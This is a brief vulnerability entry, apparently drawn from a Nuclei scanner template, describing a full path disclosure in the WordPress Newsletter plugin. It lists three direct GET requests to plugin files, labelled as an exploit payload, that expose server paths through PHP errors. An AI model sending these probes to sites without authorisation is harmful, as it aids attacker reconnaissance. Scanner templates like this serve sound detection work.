# Vulnerability: WordPress Plugin Newsletter - Full Path Disclosure
**Classification:** DEBUG
**Source:** Nuclei Template (`wp-newsletter-fpd.yaml`)

## Description
WordPress Plugin Newsletter plugin files are publicly accessible without ABSPATH protection, exposing sensitive server path information through PHP error messages when accessed directly.

## Vulnerable Code Pattern / Exploit Payload
```http
GET {{BaseURL}}/wp-content/plugins/newsletter/admin.php
GET {{BaseURL}}/wp-content/plugins/newsletter/emails/blocks/footer/block.php
GET {{BaseURL}}/wp-content/plugins/newsletter/emails/blocks/cta/block.php
```

